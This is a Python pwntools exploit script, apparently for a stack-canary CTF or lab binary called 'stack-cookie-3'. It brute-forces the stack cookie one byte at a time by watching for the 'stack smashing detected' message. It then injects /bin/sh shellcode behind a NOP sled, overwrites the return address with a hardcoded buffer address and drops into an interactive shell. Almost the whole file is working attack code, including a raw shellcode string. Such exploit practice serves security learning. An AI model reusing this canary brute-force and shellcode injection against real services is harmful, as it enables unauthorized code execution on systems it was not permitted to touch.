#!/usr/bin/env python

import sys
from pwn import *

SHELLCODE='j2X\xcd\x80PP[YjGX\xcd\x801\xc91\xd2j\x0bX\x99Rhn/shh//biT[\xcd\x80'
env = {
        "asdf" : "\x90" * 30000 + SHELLCODE
        }
p = process("./stack-cookie-3", env=env)

length=130
for i in range(256):
    print('1')
    print p.recvrepeat(0.01)
    # Prints:
    #  You have 2000 trials left
    #  How many bytes do you want to read?
    p.sendline(str(length))
    # Sends 130 bytes
    print('2')
    print p.recvrepeat(0.01)
    # Reading 130 bytes:
    string="A"*128 + '\x00' + chr(i)
    print('sending:')
    print(string)
    p.send(string)
    print('3')
    l=p.recvrepeat(0.01)
    print (l)
    # Hello _________ !
    # *** stack smashing detected ***: ./stack-cookie-3
    if 'smashing' not in l:
        second=i
        print ("RESULT %d" % i)
        length=131
        break

length=132
p.sendline(str(length))
# Sends 132 bytes
print p.recvrepeat(0.01)
string="A"*128 + '\x00' + chr(second)+chr(0)
print(string)
p.send(string)
print('3')
l=p.recvrepeat(0.01)
print (l)
# Hello _________ !
# *** stack smashing detected ***: ./stack-cookie-3

for i in range(256):
    print('1')
    print p.recvrepeat(0.01)
    # Prints:
    #  You have 2000 trials left
    #  How many bytes do you want to read?
    p.sendline(str(length))
    # Sends 132 bytes
    print('2')
    print p.recvrepeat(0.01)
    # Reading 130 bytes:
    string="A"*128 + '\x00' + chr(second)+chr(i)
    print('sending:')
    print(string)
    p.send(string)
    print('3')
    l=p.recvrepeat(0.01)
    print (l)
    # Hello _________ !
    # *** stack smashing detected ***: ./stack-cookie-3
    if 'smashing' not in l:
        third=i
        print ("NEXT RESULT %d" % i)
        break

length=134
p.sendline(str(length))
# Sends 134 bytes
print('test')
print p.recvrepeat(0.01)
string="A"*128 + '\x00' + chr(second)+chr(third)+chr(0)
print('sending:')
print(string)
p.send(string)
print('3')
l=p.recvrepeat(0.01)
print (l)
# Hello _________ !
# *** stack smashing detected ***: ./stack-cookie-3

for i in range(256):
    print('1')
    print p.recvrepeat(0.01)
    # Prints:
    #  You have 2000 trials left
    #  How many bytes do you want to read?
    p.sendline(str(length))
    # Sends 132 bytes
    print('2')
    print p.recvrepeat(0.01)
    # Reading 130 bytes:
    string="A"*128 + '\x00' + chr(second)+chr(third)+chr(i)
    print('sending:')
    print(string)
    p.send(string)
    print(sys.getsizeof(string))
    print('3')
    l=p.recvrepeat(0.01)
    print (l)
    # Hello _________ !
    # *** stack smashing detected ***: ./stack-cookie-3
    if 'smashing' not in l:
        fourth=i
        print ("LAST RESULT %d" % i)
        #p.interactive()
        break

l=p.recvrepeat(0.01)
print (l)

#buf = "A" * 0x80 +

#gdb -> b main -> print system
system = 0xf7e39da0
# get shell addr
c=Core('core')
#sh_addr=c.stack.find('sh')
buff_add=c.stack.find('A'*128)
print(buff_add)
sh_addr=0xf7f5aa0b
print('shell address: ')
print(hex(sh_addr))
SHELLCODE='j2X\xcd\x80PP[YjGX\xcd\x801\xc91\xd2j\x0bX\x99Rhn/shh//biT[\xcd\x80'
#string="A"*0x80+'\x00'+chr(second)+chr(third)+chr(fourth)+"AAAA"*3 + p32(sh_addr)
#string = SHELLCODE + "A"*(0x80 - len(SHELLCODE)) + chr(second) + chr(third) + chr(fourth) + "AAAA"*3 + p32(buff_add)
buff_add = 0xffffd438
string = "\x90"*(0x80 - len(SHELLCODE) - 30) + SHELLCODE + "\x90" * 30  + chr(0) + chr(second) + chr(third) + chr(fourth) + "AAAA"*3 + p32(buff_add)
#string = SHELLCODE + "A"*(0x80 - len(SHELLCODE)) + chr(second) + chr(third) + chr(fourth) + "AAAA"*3 + p32(0xffffc101)

raw_input("press ENTER to continue")
length=len(string)
p.sendline(str(length))

print p.recvrepeat(0.01)

print('sending:')
print(string)
p.send(string)
print p.recvrepeat(0.01)
p.interactive()

print('\x00'+chr(second)+chr(third)+chr(fourth))
print('Second: ')
print(second)
print('Third: ')
print(third)
print('Fourth: ')
print(fourth)
~

